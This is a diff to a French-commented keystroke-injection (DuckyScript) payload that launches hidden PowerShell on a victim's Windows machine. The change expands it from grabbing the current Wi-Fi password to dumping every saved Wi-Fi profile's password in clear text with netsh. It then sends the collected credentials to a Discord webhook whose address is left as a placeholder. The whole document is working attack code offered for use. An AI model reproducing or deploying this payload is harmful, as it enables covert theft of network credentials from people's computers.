@@ -7,13 +7,33 @@ REM Taper et exécuter PowerShell en mode caché
 STRING powershell -WindowStyle Hidden
 ENTER
 DELAY 500
-REM # Récupère le nom du profil et le mot de passe du réseau Wi-Fi connecté, et envoie au Webhook Discord
-STRING $profileName = (netsh wlan show interfaces | Select-String -Pattern "^....SSID" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
+
+REM Récupérer tous les profils Wi-Fi et leurs mots de passe
+STRING $wifiProfiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
 ENTER
 DELAY 500
-STRING $wifiPassword = (netsh wlan show profile name="$profileName" key=clear | Select-String -Pattern "Contenu de la cl\u00e9" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
+
+STRING $wifiData = ""
 ENTER
 DELAY 500
-STRING Invoke-RestMethod -Uri "YOUR WEBHOOK HERE" -Method Post -ContentType "application/json" -Body (ConvertTo-Json -InputObject @{ content = "SSID: $profileName`nPassword: $wifiPassword" })
+
+STRING foreach ($profile in $wifiProfiles) {
+ENTER
+DELAY 500
+
+STRING $password = netsh wlan show profile name="$profile" key=clear | Select-String "Contenu de la cl\u00e9" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+ENTER
+DELAY 500
+
+STRING $wifiData += "SSID: $profile`nPassword: $password`n`n"
+ENTER
+DELAY 500
+
+STRING }
+ENTER
+DELAY 500
+
+REM Envoyer les informations au Webhook Discord
+STRING Invoke-RestMethod -Uri "YOUR DISCORD WEBHOOK HERE" -Method Post -ContentType "application/json" -Body (ConvertTo-Json -InputObject @{ content = $wifiData })
 ENTER
 DELAY 500
